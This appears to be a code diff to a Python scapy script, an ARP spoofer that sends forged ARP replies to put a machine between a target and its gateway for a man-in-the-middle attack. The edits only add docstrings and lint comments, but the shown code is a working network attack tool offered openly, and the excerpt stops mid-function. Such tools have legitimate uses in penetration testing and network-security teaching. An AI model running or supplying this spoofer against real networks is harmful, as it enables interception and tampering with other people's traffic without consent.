@@ -1,9 +1,12 @@
+"""ARP Spoofer — sends spoofed ARP packets to perform a MITM attack."""
+
 import time
 
 import scapy.all as scapy
 
 
 class ArpSpoofer:
+    """Performs ARP spoofing between a target and gateway."""
     def __init__(self, target_ip, gateway_ip, interval=4):
         """
         Initialize the ARP Spoofer with the target IP and gateway IP.
@@ -17,15 +20,16 @@ class ArpSpoofer:
 
     def get_mac(self, ip):
         """Get the MAC address of a device using its IP address."""
-        return scapy.getmacbyip(ip)
+        return scapy.getmacbyip(ip)  # pylint: disable=no-member
 
     def spoof(self, target_ip, spoof_ip):
         """
-        Send an ARP spoofing packet to the target, pretending to be the spoof_ip (either gateway or target).
+        Send an ARP spoofing packet to the target.
+
         :param target_ip: The IP address to send the spoofed ARP response to.
-        :param spoof_ip: The IP address that the target should believe the packet is from.
+        :param spoof_ip: The IP address the target should believe the packet is from.
         """
-        packet = scapy.ARP(
+        packet = scapy.ARP(  # pylint: disable=no-member
             op=2, pdst=target_ip, hwdst=self.get_mac(target_ip), psrc=spoof_ip
         )
         scapy.send(packet, verbose=False)
@@ -38,7 +42,7 @@ class ArpSpoofer:
         """
         destination_mac = self.get_mac(destination_ip)
         source_mac = self.get_mac(source_ip)
-        packet = scapy.ARP(
+        packet = scapy.ARP(  # pylint: disable=no-member
             op=2,
             pdst=destination_ip,
             hwdst=destination_mac,
